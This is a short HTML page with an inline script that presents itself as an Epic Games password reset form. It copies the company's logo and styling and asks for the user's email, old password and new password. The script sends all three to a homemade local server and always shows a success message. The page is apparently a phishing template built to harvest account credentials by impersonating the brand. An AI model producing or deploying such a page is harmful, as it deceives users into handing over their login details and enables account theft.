<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Epic Games Password Reset</title>
    <link rel="stylesheet" href="epicgames-html-password.css">
    <style>
        /* Styling similar to what we discussed */
    </style>
</head>
<body>
    <div class="container">
        <!-- Logo Section -->
        <div class="logo">
            <img src="https://i.ibb.co/PTf4kjw/epic-games-logo.jpg" alt="Epic Games Logo">
        </div>

        <!-- Instructions -->
        <div class="MuiTypography-root MuiTypography-body1 mui-o497ds">
            Enter your new password for your Epic Games account.
        </div>

        <!-- Form Section -->
        <form id="resetForm">
            <!-- Email Section -->
            <div class="form-group">
                <label for="email">Email</label>
                <input type="email" id="email" name="email" placeholder="Enter your email" required>
            </div>

            <!-- Old Password Section -->
            <div class="form-group">
                <label for="oldPassword">Old Password</label>
                <input type="password" id="oldPassword" name="oldPassword" placeholder="Enter your old password" required>
            </div>

            <!-- New Password Section -->
            <div class="form-group">
                <label for="newPassword">New Password</label>
                <input type="password" id="newPassword" name="newPassword" placeholder="Enter your new password" required>
            </div>

            <!-- Submit Button -->
            <button type="submit" class="submit-btn">Reset Password</button>
        </form>

        <!-- Success message (hidden by default) -->
        <div id="successMessage" style="display: none;">
            <h2>Password Reset Successfully!</h2>
        </div>
    </div>

    <script>
        // Handle form submission with AJAX to avoid page reload
        document.getElementById('resetForm').addEventListener('submit', function(e) {
            e.preventDefault();  // Prevent the form from submitting normally

            const email = document.getElementById('email').value;
            const oldPassword = document.getElementById('oldPassword').value;
            const newPassword = document.getElementById('newPassword').value;

            const data = { email, oldPassword, newPassword };

            fetch('http://localhost:3000/reset-password', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(data)
            })
            .then(response => response.json())
            .then(data => {
                document.getElementById('successMessage').style.display = 'block';
                document.getElementById('resetForm').reset();  // Reset form fields
            })
            .catch(error => {
                console.error('Error:', error);
            });
        });
    </script>
</body>
</html>
